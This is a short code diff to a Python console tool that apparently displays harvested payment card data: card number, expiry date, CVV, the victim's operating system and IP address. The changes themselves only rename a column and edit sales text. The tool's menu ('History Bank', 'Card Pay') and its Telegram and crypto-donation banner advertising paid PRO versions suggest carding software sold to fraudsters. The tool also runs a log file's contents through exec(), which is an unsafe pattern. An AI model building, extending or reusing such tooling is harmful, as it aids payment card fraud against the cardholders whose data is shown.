@@ -18,7 +18,7 @@ class B:
     def __call__(self):
         while True:
             x = PrettyTable()
-            x.field_names = ['os', 'number', 'date', 'cvv2', 'ip']
+            x.field_names = ['os', 'number', 'date', 'cvv', 'ip']
             exec(open('dist/log.log').read())
             print(x)
             time.sleep(1)
@@ -62,13 +62,13 @@ logo=(f"""\n
  |--> eth: {meta['donate']['eth']}
 [>] Telegram    : {meta['telegram']}
  |--> status: {meta['status']}
- # other tools | buy PRO or VIP in telegram :>\n""")
+ # other tools | in my telegram :>\n""")
 print(logo)
 upd()
 print("""
 [0] History Bank
 [1] Card Pay
-[2] Helping | other tools | buy PRO or VIP version
+[2] Helping | other tools | buy PRO version
 """)
 used = input("num lock: ")
 if used=='0':
